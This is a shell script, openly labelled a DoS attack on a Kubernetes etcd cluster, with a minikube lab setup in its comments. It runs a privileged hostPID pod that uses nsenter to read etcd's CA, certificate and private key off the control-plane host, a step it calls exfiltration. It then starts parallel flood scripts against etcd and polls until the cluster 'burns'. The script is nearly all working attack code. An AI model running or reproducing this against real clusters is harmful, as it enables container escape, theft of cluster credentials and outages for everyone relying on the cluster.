#!/bin/sh
#
# Basic DoS attack against a Kubernetes etcd cluster.
#
# Requires:
# - kubectl
# - etcdctl
#
# Local simulation test:
#   1) minikube start --container-runtime=containerd --kubernetes-version=v1.20.4
#   2) ./etcd-dos.sh

# Implement shell safety
set -eux -o pipefail
kubectl get po -A --watch &

# Step #0: honk!
sed s/X/1--hh--hh---oooo---n-nnn---kk--kk--1/ < honk.yaml | kubectl apply -f -
sed s/X/2--hh--hh--oo--oo--nn--nn--kk-kk---2/ < honk.yaml | kubectl apply -f -
sed s/X/3--hhhhhh--oo--oo--nn--nn--kkk-----3/ < honk.yaml | kubectl apply -f -
sed s/X/4--hh--hh--oo--oo--nn--nn--kk-kk---4/ < honk.yaml | kubectl apply -f -
sed s/X/5--hh--hh---oooo---nn--nn--kk--kk--5/ < honk.yaml | kubectl apply -f -

# Step #1: Find certificate paths
ca_remote=$(kubectl describe po -l component=kube-apiserver -n kube-system | grep etcd-cafile= | cut -d= -f2)
cert_remote=$(kubectl describe po -l component=kube-apiserver -n kube-system | grep etcd-certfile= | cut -d= -f2)
cert_key=$(kubectl describe po -l component=kube-apiserver -n kube-system | grep etcd-keyfile= | cut -d= -f2)
peer_url=$(kubectl describe po -l component=etcd,tier=control-plane -n kube-system | grep advertise-client-urls= | cut -d= -f2)

# Step #2: Exfiltrate certificates
function root_cat () {
    local src=$1
    kubectl run cilium-$$ -n kube-system --restart=Never -ti --rm --image lol --overrides "{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"cat\",\"$src\"],\"securityContext\":{\"privileged\":true}}]}}"
}

root_cat $ca_remote > /tmp/$$.ca
root_cat $cert_remote > /tmp/$$.crt
root_cat $cert_key > /tmp/$$.key

# Step #3: Confirm etcd health
env ETCDCTL_API=3 etcdctl --cacert /tmp/$$.ca --cert /tmp/$$.crt --key /tmp/$$.key  --endpoints $peer_url --write-out=table endpoint status

# Step #4: Keep etcd busy
./etcd-dos.sh "/tmp/$$" "${peer_url}" key &
./etcd-dos.sh "/tmp/$$" "${peer_url}" value &
./etcd-dos.sh "/tmp/$$" "${peer_url}" master &
./etcd-dos.sh "/tmp/$$" "${peer_url}" . &

# Step #5: Watch etcd burn to the ground
set +e
while [ ! -f /tmp/stop ]; do
  sleep 2
  env ETCDCTL_API=3 etcdctl --cacert /tmp/$$.ca --cert /tmp/$$.crt --key /tmp/$$.key  --endpoints $peer_url --write-out=table endpoint status
done

echo "end evil"
